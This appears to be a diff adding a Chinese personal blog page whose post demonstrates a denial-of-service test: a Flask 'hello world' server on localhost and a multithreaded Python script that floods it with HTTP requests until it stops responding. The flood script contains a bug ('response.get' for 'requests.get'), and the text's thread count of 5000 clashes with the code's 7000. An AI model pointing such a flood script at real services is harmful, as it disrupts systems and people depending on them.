@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Dos攻击验证 | gdq桃仙</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://loplopuu23.github.io/favicon.ico?v=1592757749030">
+<link rel="stylesheet" href="https://loplopuu23.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Distributed denial of service attack DDos需要大量的肉鸡，以及高带宽。
+这边在自己家里我们验证下Dos攻击
+我们先简单的在虚拟机创建一个网页
+
+from flask import Flask
+
+app..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://loplopuu23.github.io">
+        <img src="https://loplopuu23.github.io/images/avatar.png?v=1592757749030" class="site-logo">
+        <h1 class="site-title">gdq桃仙</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://loplopuu23.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Dos攻击验证</h2>
+            <div class="post-date">2020-06-21</div>
+            
+            <div class="post-content" v-pre>
+              <p>Distributed denial of service attack DDos需要大量的肉鸡，以及高带宽。<br>
+这边在自己家里我们验证下Dos攻击</p>
+<h2 id="我们先简单的在虚拟机创建一个网页">我们先简单的在虚拟机创建一个网页</h2>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20200622002351837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODY2OTIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code class="language-python">from flask import Flask
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    return &quot;hello world&quot;
+if __name__ ==&quot;__main__&quot;:
+    app.run(host=&quot;127.0.0.1&quot;,port=80)
+</code></pre>
+<p>运行<br>
+<img src="https://img-blog.csdnimg.cn/2020062200261844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODY2OTIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
+<img src="https://img-blog.csdnimg.cn/20200622002629675.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="我们来写dos攻击的脚本">我们来写Dos攻击的脚本</h2>
+<pre><code class="language-python">from threading import Thread
+import requests
+
+
+status = {&quot;200&quot;:0,&quot;404&quot;:0,&quot;500&quot;:0}
+
+
+class DDos(Thread):
+    def __init__(self,host,port=80):
+        super().__init__()
+        self.host = host
+        self.port = port
+    
+    def run(self)-&gt; None:
+        while True:
+            self.sendHttpRequest(self.host)
+            print(status)
+            
+    
+    def sendHttpRequest(self,url):
+        global status
+        try:
+            response=response.get(url,timeout=0.5).status_code
+            status[str(response)]+=1
+            print(status)
+            
+        except:
+            pass
+
+if __name__ =='__main__':
+    for i in range(7000):
+        t = DDos(&quot;http://127.0.0.1/&quot;)
+        t.start()
+        
+    t.join()
+    
+        
+</code></pre>
+<p>我们来运行一下 这里取5000的线程</p>
+<p><img src="https://img-blog.csdnimg.cn/20200622004053288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODY2OTIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
+<img src="https://img-blog.csdnimg.cn/20200622004139952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODY2OTIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<p>此时我们的网页已无响应</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://loplopuu23.github.io/post/lol-yi-you-wang-luo-yan-zheng-po-jie-zong-jie/">
+                  <h3 class="post-title">
+                    LOL易游网络验证破解总结
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
